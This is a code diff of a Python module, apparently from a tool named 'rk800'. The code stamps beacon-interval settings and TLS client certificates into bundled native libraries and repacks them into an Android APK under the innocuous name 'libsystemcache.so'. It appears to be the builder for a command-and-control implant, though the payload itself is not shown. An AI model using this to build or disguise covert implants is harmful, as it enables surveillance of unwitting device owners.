@@ -1,17 +1,20 @@
 from rk800.tls_cert import CertManager
 from rk800.apk_repack import APKRepack
 import argparse
+import tempfile
 from pathlib import Path
+from importlib.resources import files
 import struct
 
 
 class Configure:
     CLIENT_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
-    CLIENT_FORMAT = "!HQQQ256s256s1024s1024s"
+    CLIENT_FORMAT = "!HQQQ256s2048s2048s2048s"
     SEC_IN_MIN = 60
 
-    def __init__(self, binary_path: Path):
-        self.binary_path = binary_path
+    def __init__(self, output_path: Path, args: argparse.Namespace):
+        self.output_path = output_path
+        self.args = args
         self.cert_manager = CertManager()
 
     def _pack_client_config(self, args: argparse.Namespace) -> bytes:
@@ -33,22 +36,54 @@ class Configure:
             client_certs["ca_cert"].encode("utf-8"),
         )
 
-    def write_configured_binary(
-        self, output_path: Path, args: argparse.Namespace = None
-    ) -> None:
-        with open(self.binary_path, "rb") as binary_file:
-            data = bytearray(binary_file.read())
+    def stamp_binary(self, binary_data: bytes, args: argparse.Namespace) -> bytes:
+        data = bytearray(binary_data)
+        
+        canary_index = data.find(self.CLIENT_CANARY)
+        if canary_index == -1:
+            raise ValueError(f"CLIENT_CANARY not found in binary data")
+        
+        packed_config = self._pack_client_config(args)
+        config_size = len(packed_config)
+        expected_size = struct.calcsize(self.CLIENT_FORMAT)
+        
+        if config_size != expected_size:
+            raise ValueError(f"Config size mismatch: got {config_size}, expected {expected_size}")
+        
+        if canary_index + config_size > len(data):
+            raise ValueError(f"Not enough space in binary for config data")
+        
+        data[canary_index : canary_index + config_size] = packed_config
+        
+        return bytes(data)
 
-        if args and hasattr(args, "beacon_interval"):
-            canary_index = data.find(self.CLIENT_CANARY)
-            if canary_index != -1:
-                packed_config = self._pack_client_config(args)
-                data[canary_index : canary_index + len(packed_config)] = packed_config
-
-        is_64 = "aarch64" in str(self.binary_path)
-        apk_bytes = APKRepack.repack(data, is_64)
-
-        with open(output_path, "wb") as output_file:
-            output_file.write(apk_bytes)
-
-        print(f"APK written to {output_path.absolute()}")
+    def write_configured_apk(self) -> None:
+        assets_path = files("rk800.assets")
+        
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            tmp_path = Path(tmp_dir)
+            
+            for resource in assets_path.iterdir():
+                if resource.name.endswith('.so'):
+                    so_bytes = resource.read_bytes()
+                    
+                    if 'x86_64' in resource.name:
+                        arch_dir = tmp_path / 'x86_64'
+                        arch_dir.mkdir(parents=True, exist_ok=True)
+                        output_file = arch_dir / 'libsystemcache.so'
+                    elif 'arm32' in resource.name:
+                        arch_dir = tmp_path / 'armeabi-v7a'
+                        arch_dir.mkdir(parents=True, exist_ok=True)
+                        output_file = arch_dir / 'libsystemcache.so'
+                    elif 'aarch64' in resource.name:
+                        arch_dir = tmp_path / 'arm64-v8a'
+                        arch_dir.mkdir(parents=True, exist_ok=True)
+                        output_file = arch_dir / 'libsystemcache.so'
+                    else:
+                        continue
+                    
+                    stamped_data = self.stamp_binary(so_bytes, self.args)
+                    output_file.write_bytes(stamped_data)
+            
+            apk_repack = APKRepack(tmp_path, self.output_path)
+            apk_repack.repack()
